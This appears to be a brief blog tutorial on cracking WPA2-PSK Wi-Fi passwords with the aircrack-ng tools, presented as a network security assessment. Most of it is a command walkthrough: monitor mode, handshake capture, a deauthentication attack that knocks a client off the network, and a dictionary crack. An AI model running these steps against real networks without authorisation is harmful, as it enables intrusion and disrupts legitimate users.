---
title: Password Cracking WPA2 PSK Networks
author: Tarus
date: 2023-06-02 16:51:00 +0300
categories: [Hacks]
tags: [wpa2, wifi, mac address, kali linux, airmon-ng]
---


WPA2-PSK

## Activities performed
- Evaluating strength of PSK
- Reviewing nearby networks, rogue devices
- Assessing guest networks ( how hard the password is to crack, is there a password, check if the guest network has some functionality that the main network have
- Checking network access

## Tools used
- wireless card supports dual band, monitor mode and packet injection.Plug and Play Wireless usb adapter -  https://amzn.to/3RQ6XCr
- Router
- Laptop

## Hacking Process
image.png

## Code

```python
iwconfig                        #wlan0 ifconfig but wireless, check if usb card is working
airmon-ng check kill            #kill processes that may interfere with what we are about to do
airmon-ng start wlan0           #allows wireless card to monitor incoming traffic
iwconfig                        #wlan0mon                #confirm
airodump-ng wlan0mon            #finding the wireless network we want to specifically attack

#bssid - mac address of access point
#PWR(power level) - the lower the number the closer we are to the device
#beacons and data - show traffic happening on those bssids

airodump-ng -c 6 --bssid 50:C7:BF:8A:00:73 -w capture wlan0mon     #tries to capture the 3 way handshake
#-c = channel of the device
#-w capture = name of the file where the capture will be stored

#to speed the above process, do the deauth attack
#open another terminal
aireplay-ng -0 1 -a 50:C7:BF:8A:00:73 -c 50:C7:BF:8A:00:74 wlan0mon
#-0 = deauth attack
#1 = only one time
#-c = client we want to deauth

aircrack-ng -w wordlist.txt -b 50:C7:BF:8A:00:73 capture.cap
#-b = AP mac address
```
